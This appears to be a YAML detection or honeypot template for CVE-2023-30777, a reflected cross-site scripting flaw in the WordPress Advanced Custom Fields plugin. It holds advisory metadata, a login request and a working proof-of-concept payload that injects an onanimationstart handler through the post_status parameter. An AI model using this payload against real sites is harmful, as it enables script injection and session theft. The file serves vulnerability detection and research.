id: CVE-2023-30777
info:
  name: Advanced Custom Fields < 6.1.6 - Cross-Site Scripting
  author: r3Y3r53
  description: 'Advanced Custom Fields beofre 6.1.6 is susceptible to cross-site scripting
    via the post_status parameter due to insufficient input sanitization and output
    escaping. An attacker can inject arbitrary script in the browser of an unsuspecting
    user in the context of the affected site. This can allow the attacker to steal
    cookie-based authentication credentials and launch other attacks.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of a victim''s browser, potentially leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: Fixed in version 6.1.6.
  reference:
  - https://wpscan.com/vulnerability/95ded80f-a47b-411e-bd17-050439bf565f
  - https://wordpress.org/plugins/advanced-custom-fields/advanced/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-30777
  - https://patchstack.com/database/vulnerability/advanced-custom-fields-pro/wordpress-advanced-custom-fields-pro-plugin-6-1-5-reflected-cross-site-scripting-xss-vulnerability?_s_id=cve
  - https://patchstack.com/database/vulnerability/advanced-custom-fields/wordpress-advanced-custom-fields-plugin-6-1-5-reflected-cross-site-scripting-xss-vulnerability?_s_id=cve
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-30777
    cwe-id: CWE-79
    epss-score: 0.00338
    epss-percentile: 0.70791
    cpe: cpe:2.3:a:advancedcustomfields:advanced_custom_fields:*:*:*:*:-:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: advancedcustomfields
    product: advanced_custom_fields
    framework: wordpress
  tags: cve2023,cve,wpscan,advance-custom-field,wp,wp-plugin,wordpress,authenticated,xss,advancedcustomfields
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-admin/edit.php?post_type=acf-post-type&post_status=%22style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29%2F%2F
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: onanimationstart=alert(document.domain)//Advanced Custom Fields
